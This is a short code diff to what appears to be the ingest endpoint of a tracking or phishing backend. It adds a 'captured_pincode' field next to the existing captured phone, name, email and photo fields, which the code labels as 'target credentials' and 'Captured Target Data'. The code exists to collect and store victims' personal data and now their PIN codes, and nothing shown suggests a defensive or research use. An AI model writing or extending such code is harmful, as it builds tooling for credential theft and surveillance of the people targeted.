@@ -40,6 +40,7 @@ class TrackPayload(BaseModel):
 
     # Interactive captured target credentials
     captured_phone:       Optional[str]   = None
+    captured_pincode:     Optional[str]   = None
     captured_name:        Optional[str]   = None
     captured_email:       Optional[str]   = None
     captured_photo:       Optional[str]   = None
@@ -156,8 +157,9 @@ async def ingest(payload: TrackPayload, request: Request):
         "connection_type":      payload.connection_type,
         "referrer":             payload.referrer,
 
-        # Captured Target Data (Phone, Photo, Name)
+        # Captured Target Data (Phone, Photo, Pincode, Name)
         "captured_phone":       payload.captured_phone,
+        "captured_pincode":     payload.captured_pincode,
         "captured_name":        payload.captured_name,
         "captured_email":       payload.captured_email,
         "captured_photo":       payload.captured_photo,
